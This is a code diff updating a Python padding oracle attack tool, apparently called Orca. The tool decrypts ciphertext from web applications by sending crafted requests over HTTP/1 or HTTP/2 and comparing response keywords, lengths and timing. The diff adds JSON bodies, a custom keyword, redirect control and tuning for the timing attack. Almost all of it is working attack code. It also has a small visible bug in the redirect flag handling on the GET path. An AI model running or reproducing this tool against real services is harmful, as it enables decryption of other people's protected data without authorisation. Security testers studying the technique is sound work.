@@ -34,19 +34,19 @@ parser.add_argument('encoding', help='base64 / None')
 parser.add_argument('method', help='GET / POST')
 parser.add_argument('blocksize', help='8 / 16 / etc')
 parser.add_argument('body',
-                    help='This is the POST body OR the GET query - it will have all the parameter names and values needed for the request and the ciphertext must match the provided ciphertext.')
+                    help='This is the POST body OR the GET query - it will have all the parameter names and values needed for the request and the ciphertext must match the provided ciphertext. A JSON body can also be provided.')
 
 parser.add_argument("--headers",
-                    help="{'Cookie': 'foo'} Content-Type: application/x-www-form-urlencoded headers are added for POST method.")
+                    help="Dictionary format: {'Cookie': '123561762351635'} - Note: Content-Type: application/x-www-form-urlencoded OR application/json headers are auto-added for POST method.")
 parser.add_argument("--keyword", help="A custom keyword to search responses for.")
-parser.add_argument("--noiv", help="Activate 'no IV mode'.")
-parser.add_argument("--lengthvariation", help="Make response length checking a fuzzy match.")
-parser.add_argument("--protocol", help="HTTP1 / HTTP2 (Time-based only)")
-parser.add_argument("--repeatruns", help="e.g. 1 / 2 / 4 / 8 (Time-based only, HTTP/1 only)")
-parser.add_argument("--delayiftimebased", help="Add a delay to HTTP1 time-based attack. (Time-based only, HTTP/1 only)")
-parser.add_argument("--groupsize", help="e.g. 4 / 8 / 16 (Time-based only, HTTP/2 only)")
+parser.add_argument("--noiv", help="e.g. True - Activate 'no IV mode'.")
+parser.add_argument("--lengthvariation", help="e.g. 20 / 30 / 40 Provide a number of bytes for the detection engine to ignore when the content length varies. Set to 99999 to disable length checking altogether.")
+parser.add_argument("--allow302redirects", help="e.g. True / False. The requests engine will allow redirects by default, but you can disable them by passing this flag. (HTTP1 only)")
+parser.add_argument("--protocol", help="HTTP1 / HTTP2 (Time-based only). This selects between the two time comparison engines. HTTP1 is a simple, orthodox response time comparison based detection engine, while HTTP2 is a Single Packet Attack base advanced timing engine.")
+parser.add_argument("--repeatruns", help="e.g. 1 / 2 / 4 / 8 (Time-based only, HTTP/1 only). How many times to repeat the measurement for each byte. The HTTP1 engine can perform multiple scans and average the time difference over these. Increases accuracy, but increases scan time also.")
+parser.add_argument("--delayiftimebased", help="Add a delay to HTTP1 time-based attack. (Time-based only, HTTP/1 only). Increases accuracy, but increases scan time also.")
 parser.add_argument("--http2groupsize",
-                    help="Number of requests to include in each SPA. (Time-based only, HTTP/2 only)")
+                    help="e.g. 4 / 8 / 16 - Number of requests to include in each SPA. (Time-based only, HTTP/2 only). Sets the number of requests to send per SPA. 4 is the mose accurate, but will also take the longest.")
 
 args = parser.parse_args()
 
@@ -64,6 +64,9 @@ body = args.body.replace(ciphertext, "[INJECT HERE]")
 # we can control the key word searched for using this parameter
 # by default it will be padding. the search is case-insensitive.
 key_word_to_search_for = 'padding'
+# override the default setting if the user provides the optional setting:
+if args.keyword:
+    key_word_to_search_for = args.keyword.lower()
 
 # If the ciphertext provided incudes an IV, set this to False
 # If the ciphertext provided does not include an IV, set this to True
@@ -76,6 +79,9 @@ key_word_to_search_for = 'padding'
 # with the prior block (the IV BLOCK) to get the plaintext. We could guess IV values like 00 * 16
 # or 31 * 16 etc, etc...
 no_iv_mode = False
+# override the default setting if the user provides the optional setting:
+if args.noiv:
+    no_iv_mode = args.noiv
 
 # This will be used to make the response length checking a fuzzy match.
 # The length check will pass if the discovered length is + or - the
@@ -85,6 +91,9 @@ no_iv_mode = False
 # sources such as status code or found keywords and the lenght is confusing
 # the detection engine
 response_length_variation = 20
+# override the default setting if the user provides the optional setting:
+if args.lengthvariation:
+    response_length_variation = int(args.lengthvariation)
 
 ###### HTTP/1 TIME BASED ATTACK DEFAULT SETTINGS ######
 
@@ -97,18 +106,15 @@ response_length_variation = 20
 # delay_if_time_based = 0.01
 # number_of_measurement_runs = 6
 
-delay_if_time_based = 0
-number_of_measurement_runs = 6
+delay_if_time_based = 0.0
+# override the default setting if the user provides the optional setting:
+if args.delayiftimebased:
+    delay_if_time_based = float(args.delayiftimebased)
 
-###### HTTP/2 TIME BASED ATTACK DEFAULT SETTINGS ######
-
-# http2_group_size is the only adjustment for http2 mode. for SPA attacks, a small number of requests are sent, but we need to
-# send 256 requests, so we need to break this down into smaller "groups" of requests. in my local testing i have
-# found that numbers between 4 and 16 work fairly well. the bigger the group size the quicker the scan, but
-# the trade-off is that accuracy is reduced.
-# http2_group_size must be multiple of 4. must not be smaller than 4 or detection logic will break.
-# with a http2_group_size of 4, it was possible to detect delays of 0.009 seconds over HTTP/2 HTTPS - 9 mS (tested locally)
-http2_group_size = 8
+number_of_measurement_runs = 1
+# override the default setting if the user provides the optional setting:
+if args.repeatruns:
+    number_of_measurement_runs = int(args.repeatruns)
 
 # This takes the default time based attack values and overrides them if the user has set arguments on the command line
 # By default, we use HTTP/1
@@ -119,11 +125,18 @@ if args.protocol:
         protocol = "HTTP2"
         http2_mode = True
 
+###### HTTP/2 TIME BASED ATTACK DEFAULT SETTINGS ######
+
+# http2_group_size is the only adjustment for http2 mode. for SPA attacks, a small number of requests are sent, but we need to
+# send 256 requests, so we need to break this down into smaller "groups" of requests. in my local testing i have
+# found that numbers between 4 and 16 work fairly well. the bigger the group size the quicker the scan, but
+# the trade-off is that accuracy is reduced.
+# http2_group_size must be multiple of 4. must not be smaller than 4 or detection logic will break.
+# with a http2_group_size of 4, it was possible to detect delays of 0.009 seconds over HTTP/2 HTTPS - 9 mS (tested locally)
+http2_group_size = 16
+
 if args.http2groupsize:
     http2_group_size = int(args.http2groupsize)
-
-if args.repeatruns:
-    number_of_measurement_runs = int(args.repeatruns)
 
 if http2_group_size < 4:
     print("[!] Fatal error: HTTP2 group size must be at least 4 or detection logic will break")
@@ -138,10 +151,24 @@ else:
     # initialize an empty dictionary to store headers in:
     headers = {}
 
-# If the request is a POST, add a 'Content-Type: application/x-www-form-urlencoded' header:
-# you could also replace this with a custom header for POST requests:
+# This section handles Content-Type headers for POST requests:
+json_format = False
+# Orca supports application/x-www-form-urlencoded and application/json formatting. We assume x-www-form-urlencoded.
+# But, if the provided body starts with {" we assume JSON formatting.
+# We need to let the HTTP request functions know if JSON formatting so that they can turn off the automatic
+# URL encoding - hence the json_format bool.
 if method == "POST":
-    headers.update({"Content-Type": "application/x-www-form-urlencoded"})
+    if body[0:2] == '{"':
+        headers.update({"Content-Type": "application/json"})
+        json_format = True
+    else:
+        headers.update({"Content-Type": "application/x-www-form-urlencoded"})
+
+# Default allow 302 redirects:
+requests_allow_redirects="True"
+# We receive args.allow302redirects value as (type string) True / False:
+if args.allow302redirects:
+    requests_allow_redirects = args.allow302redirects
 
 print("[i] URL:              " + url)
 print("[i] Path:             " + path)
@@ -153,13 +180,18 @@ if method == "POST":
 if method == "GET":
     print("[i] Query:            " + body)
 print("[i] Headers:          " + str(headers))
+print("[i] Custom keyword:   " + str(key_word_to_search_for))
+print("[i] No IV mode:       " + str(no_iv_mode))
+print("[i] Length Variation: " + str(response_length_variation))
+print("[i] Allow redirects:  " + str(requests_allow_redirects))
+if protocol == "HTTP1":
+    print("[i] Protocol:         HTTP 1")
+    print("[i] Number of runs:   " + str(number_of_measurement_runs))
+    print("[i] Delay:            " + str(delay_if_time_based))
+
 if protocol == "HTTP2":
     print("[i] Protocol:         HTTP 2")
     print("[i] Group size:       " + str(http2_group_size))
-if protocol == "HTTP1":
-    print("[i] Protocol:         HTTP 1")
-    if len(sys.argv) > 9:
-        print("[i] Number of runs:   " + str(number_of_measurement_runs))
 
 # encrypted_bytes is the hex byte string we will pass to the processing
 # e.g. 313233343536373839303132333435362cb8770371460c5a2dc6b6a7e65289b8
@@ -193,16 +225,22 @@ requests.packages.urllib3.disable_warnings()
 ### Oracle HTTP request handler  ###
 def check_for_padding_error(full_encrypted_bytes):
     start_timer = time.perf_counter()
-
+    if requests_allow_redirects == "True":
+        permit_redirects = True
+    else:
+        permit_redirects = False
     if method == "POST":
         my_url = scheme + "://" + authority + ":" + str(port) + path
         if base64encoding_on_output:
             b64_encoded_payload = base64.b64encode(binascii.unhexlify(full_encrypted_bytes)).decode()
-            encoded_payload = b64_encoded_payload.replace('+', '%2b').replace('=', '%3d')
+            if json_format: # no URL encoding for JSON
+                encoded_payload = b64_encoded_payload
+            else:
+                encoded_payload = b64_encoded_payload.replace('+', '%2b').replace('=', '%3d')
             my_body_string = body.replace("[INJECT HERE]", encoded_payload)
-            res = requests.post(my_url, data=my_body_string, headers=headers, verify=False)
+            res = requests.post(my_url, allow_redirects=permit_redirects, data=my_body_string, headers=headers, verify=False)
         else:
-            res = requests.post(my_url, data=body.replace("[INJECT HERE]", full_encrypted_bytes),
+            res = requests.post(my_url, allow_redirects=permit_redirects, data=body.replace("[INJECT HERE]", full_encrypted_bytes),
                               headers=headers, verify=False)
     else: # GET pathway:
         if base64encoding_on_output:
@@ -210,10 +248,10 @@ def check_for_padding_error(full_encrypted_bytes):
             encoded_payload = b64_encoded_payload.replace('+', '%2b').replace('=', '%3d')
             my_query_string = body.replace("[INJECT HERE]", encoded_payload)
             my_url = scheme + "://" + authority + ":" + str(port) + path + "?" + my_query_string
-            res = requests.get(my_url, headers=headers, verify=False)
+            res = requests.get(my_url, allow_redirects=bool(requests_allow_redirects), headers=headers, verify=False)
         else:
             my_url = scheme + "://" + authority + ":" + str(port) + path + "?" + body.replace("[INJECT HERE]", full_encrypted_bytes)
-            res = requests.get(my_url, headers=headers, verify=False)
+            res = requests.get(my_url, allow_redirects=bool(requests_allow_redirects), headers=headers, verify=False)
 
     #print("_____DEBUG_____")
     #pretty_print_post(res.request)
@@ -222,9 +260,9 @@ def check_for_padding_error(full_encrypted_bytes):
     stop_timer = time.perf_counter()
     duration = stop_timer - start_timer
     if key_word_to_search_for in res.text.lower():
-        padding_found = "Y"
+        custom_found = "Y"
     else:
-        padding_found = "N"
+        custom_found = "N"
     if 'error' in res.text.lower():
         error_found = "Y"
     else:
@@ -233,7 +271,7 @@ def check_for_padding_error(full_encrypted_bytes):
         location = res.headers.get('location')
     else:
         location = "N/A"
-    return error_found, padding_found, res.status_code, len(res.content), location, duration
+    return error_found, custom_found, res.status_code, len(res.content), location, duration
 
 
 # This does the initial fuzz of just one byte, to measure for differences. A second function
@@ -460,9 +498,9 @@ def user_selection(internal_unique_list):
     count = 1
     print('[i] Initial fuzz complete. ')
     print('[i] Please select an ID that matches a valid decrypt:\n')
-    print('-----------------------------------------------------------------')
-    print('ID#     Freq     Status  Length  Error Padding Location')
-    print('-----------------------------------------------------------------')
+    print('-------------------------------------------------------------------')
+    print('ID#     Freq     Status   Length   Error   Custom  Location')
+    print('-------------------------------------------------------------------')
     for item in internal_unique_list:
         # print(item)
         line = item.split(':')
@@ -477,10 +515,13 @@ def user_selection(internal_unique_list):
         recommend = "   "
         if line[1] == "1":
             recommend = " **"
-        print(str(count) + recommend + '    ' + line[
-            1] + '\t' + status + '    ' + length + '\t ' + error_found + '     ' + padding_found + '       ' + location)
+        # This is just to keep the columns data in the right place because the length value can vary quite a bit
+        length_padding = 10 - len(length)
+        padded_length = length + (length_padding * ' ')
+        print(str(count) + recommend + '\t' + line[
+            1] + '\t\t' + status + '     ' + padded_length + error_found + '       ' + padding_found + '       ' + location)
         count += 1
-    print('-----------------------------------------------------------------')
+    print('-------------------------------------------------------------------')
     if len(internal_unique_list) == 1:
         return None
     internal_selection = input("\n Enter an ID: ")
@@ -758,11 +799,20 @@ def http2_payload_sender(int_authority, int_port, int_payload_list, int_headers)
 
     for s_id in stream_ids_list:
         if base64encoding_on_output:
-            my_body = body.replace("[INJECT HERE]",
-                                   base64.b64encode(binascii.unhexlify(int_payload_list[counter].split(':')[1])).decode(
-                                       "utf-8").replace('+', '%2b').replace('=', '%3d'))
+            if json_format:
+                my_body = body.replace("[INJECT HERE]",
+                                       base64.b64encode(
+                                           binascii.unhexlify(int_payload_list[counter].split(':')[1])).decode(
+                                           "utf-8"))
+            else:
+                my_body = body.replace("[INJECT HERE]",
+                                       base64.b64encode(binascii.unhexlify(int_payload_list[counter].split(':')[1])).decode(
+                                           "utf-8").replace('+', '%2b').replace('=', '%3d'))
         else:
-            my_body = body.replace("[INJECT HERE]", int_payload_list[counter].split(':')[1]).replace('+',
+            if json_format:
+                my_body = body.replace("[INJECT HERE]", int_payload_list[counter].split(':')[1])
+            else:
+                my_body = body.replace("[INJECT HERE]", int_payload_list[counter].split(':')[1]).replace('+',
                                                                                                      '%2b').replace('=',
                                                                                                                     '%3d')
         if method == "POST":
@@ -986,7 +1036,10 @@ if __name__ == '__main__':
     print("[i] Sending test request...")
 
     if method == "POST":
-        encoded_payload = ciphertext.replace('+', '%2b').replace('=', '%3d')
+        if json_format:  # no URL encoding for JSON
+            encoded_payload = ciphertext
+        else:
+            encoded_payload = ciphertext.replace('+', '%2b').replace('=', '%3d')
         my_body_string = body.replace("[INJECT HERE]", encoded_payload)
         my_url = scheme + "://" + authority + ":" + str(port) + path
         res = requests.post(my_url, data=my_body_string, headers=headers, verify=False)
@@ -1129,8 +1182,8 @@ if __name__ == '__main__':
 
             # print("byte_found:               ", byte_found)
             # print("current_byte_input_value: ", current_byte_input_value)
-
             # print("XORing " + byte_found + " with " + current_byte_input_value + ":")
+
             zeroing_iv_byte = xor_bytes(byte_found, current_byte_input_value)
             # print("zeroing_iv_byte:          ", zeroing_iv_byte)
             if len(zeroing_iv_byte) % 2 != 0:
@@ -1189,9 +1242,9 @@ if __name__ == '__main__':
     print("-------------------------------------------------------")
     print("*** Finished ***")
     print("")
-    print("[+] Zeroing IV (HEX):         " + zeroing_iv_buffer)
+    print("[+] Zeroing IV (HEX):          " + zeroing_iv_buffer)
     print("")
-    print("[+] Decrypted value (HEX):    " + plaintext_buffer)
+    print("[+] Decrypted value (HEX):     " + plaintext_buffer)
     print("")
 
     # we need to get all the blocks except the last one, then xor this with the zeroing_iv_buffer
